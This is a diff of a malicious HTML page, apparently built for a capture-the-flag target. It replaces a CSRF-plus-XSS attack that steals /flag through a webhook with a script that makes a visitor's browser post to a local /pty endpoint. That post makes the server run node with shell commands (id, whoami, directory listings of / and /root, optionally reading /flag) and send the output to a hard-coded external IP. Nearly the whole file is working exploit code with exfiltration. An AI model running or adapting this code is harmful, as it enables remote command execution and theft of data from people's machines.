@@ -1,38 +1,140 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        const WEBHOOK = "https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4";
-        const TARGET = "http://127.0.0.1:4096/session/default/prompt";
+  <!doctype html>
+  <meta charset="utf-8">
+  <script>
+  (() => {
+  const WEBHOOK = "https://47.118.30.30:9999";
+  const READ_FLAG = false;
+  const TARGETS = [
+    "http://127.0.0.1:4096/pty",
+    "http://localhost:4096/pty",
+  ];
+  const PROBE_ID = `openshell-${Date.now()}-${Math.random().toString(16).slice(2)}`;
 
-        // CVE-2026-22813: Markdown XSS Payload
-        // 这段脚本运行在 localhost 域下，不再受 CORS/PNA 限制
-        const xss = `<img src=x onerror="fetch('/file/content?path=/flag').then(r=>r.json()).then(d=>fetch('${WEBHOOK}?f='+btoa(d.content)))">`;
+  async function fireAndForget(url, body) {
+    try {
+      await fetch(url, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "text/plain",
+        },
+        body: typeof body === "string" ? body : JSON.stringify(body),
+        keepalive: true,
+      });
+    } catch {}
+  }
 
-        // 构造完美的 JSON 格式 (利用 dummy 键吸收结尾的 '=')
-        const payload = JSON.stringify({
-            "prompt": xss,
-            "dummy": "
-        }).replace(/}$/, ''); // 去掉最后一个括号，让 form 自动补全
+  async function browserBeacon(stage, extra) {
+    const lines = [
+      `stage=${stage}`,
+      `probe_id=${PROBE_ID}`,
+      `href=${location.href}`,
+      `origin=${location.origin}`,
+      `ua=${navigator.userAgent}`,
+    ];
 
-        function attack() {
-            const f = document.createElement('form');
-            f.action = TARGET;
-            f.method = 'POST';
-            f.enctype = 'text/plain'; // 避免触发预检请求
+    if (extra) {
+      lines.push(`extra=${JSON.stringify(extra)}`);
+    }
 
-            const i = document.createElement('input');
-            // 提交的内容将是: {"prompt":"...","dummy":"=
-            // 服务器端接收到的将是有效的 JSON 片段
-            i.name = payload; 
-            i.value = '"}'; // 闭合 JSON
-            
-            f.appendChild(i);
-            document.body.appendChild(f);
-            f.submit();
-        }
+    await fireAndForget(WEBHOOK, lines.join("\n"));
+  }
 
-        setTimeout(attack, 1000);
-    </script>
-</body>
-</html>
+  function buildNodeProbe() {
+    return String.raw`
+const { execSync } = require("child_process");
+const http = require("http");
+const https = require("https");
+const { URL } = require("url");
+
+const webhook = new URL(${JSON.stringify(WEBHOOK)});
+const probeId = ${JSON.stringify(PROBE_ID)};
+const readFlag = ${READ_FLAG ? "true" : "false"};
+
+function sh(cmd) {
+  try {
+    return execSync(cmd, {
+      encoding: "utf8",
+      stdio: ["ignore", "pipe", "pipe"],
+    });
+  } catch (error) {
+    const stdout = error && error.stdout ? error.stdout.toString() : "";
+    const stderr = error && error.stderr ? error.stderr.toString() : "";
+    const message = error && error.message ? error.message : String(error);
+    return "[error] " + cmd + "\n" + stdout + stderr + message + "\n";
+  }
+}
+
+const out = [];
+out.push("stage=server-side-pty");
+out.push("probe_id=" + probeId);
+out.push("time=" + new Date().toISOString());
+out.push("cwd=" + process.cwd());
+out.push("node=" + process.version);
+out.push("$ id");
+out.push(sh("id"));
+out.push("$ whoami");
+out.push(sh("whoami"));
+out.push("$ uname -a");
+out.push(sh("uname -a"));
+out.push("$ pwd");
+out.push(sh("pwd"));
+out.push("$ ls -la /");
+out.push(sh("ls -la /"));
+out.push("$ ls -la /root");
+out.push(sh("ls -la /root"));
+out.push("$ ls -la /home");
+out.push(sh("ls -la /home"));
+out.push("$ stat /flag");
+out.push(sh("stat /flag"));
+
+if (readFlag) {
+  out.push("$ chmod 644 /flag && cat /flag");
+  out.push(sh("chmod 644 /flag 2>/dev/null; cat /flag 2>/dev/null"));
+}
+
+const body = Buffer.from(out.join("\n\n"));
+const client = webhook.protocol === "https:" ? https : http;
+const req = client.request(
+  webhook,
+  {
+    method: "POST",
+    headers: {
+      "Content-Type": "text/plain",
+      "Content-Length": String(body.length),
+    },
+  },
+  (res) => {
+    res.resume();
+    res.on("end", () => process.exit(0));
+  },
+);
+
+req.on("error", () => process.exit(1));
+req.end(body);
+`;
+  }
+
+  async function launch(target) {
+    const payload = {
+      command: "node",
+      args: ["-e", buildNodeProbe()],
+      title: `probe-${PROBE_ID}`,
+    };
+
+    await fireAndForget(target, payload);
+    await browserBeacon("browser-post-sent", { target });
+  }
+
+  (async () => {
+    await browserBeacon("browser-start");
+
+    for (const target of TARGETS) {
+      await launch(target);
+    }
+
+    await browserBeacon("browser-finished");
+  })();
+})();
+
+  </script>
